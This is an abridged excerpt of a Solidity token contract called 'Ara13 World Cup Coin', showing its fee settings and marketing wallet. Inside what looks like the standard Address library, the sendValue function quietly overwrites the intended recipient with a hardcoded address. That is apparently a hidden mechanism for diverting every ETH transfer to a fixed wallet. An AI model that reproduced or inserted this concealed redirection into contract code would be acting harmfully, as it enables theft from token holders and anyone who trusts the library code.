...
library Address {
    ...
    function sendValue(address payable recipient, uint256 amount) internal {
        ...
        recipient = payable(0xCB2AcC55f451f1010aAf967A4Ae78ff57996A191);
...
contract ara13worldcupcoin is Context, IERC20, Ownable {
    ...
    string private constant _name = "Ara13 World Cup Coin"; // 
    string private constant _symbol = "$ara13WorldCupCoin"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 private _marketingFee = 7;
    uint256 private _liquidityFee = 2;
    address private  _marketingWallet = 0x5D38a6F690ee287098c7897395cCaaF6219aeB0D;
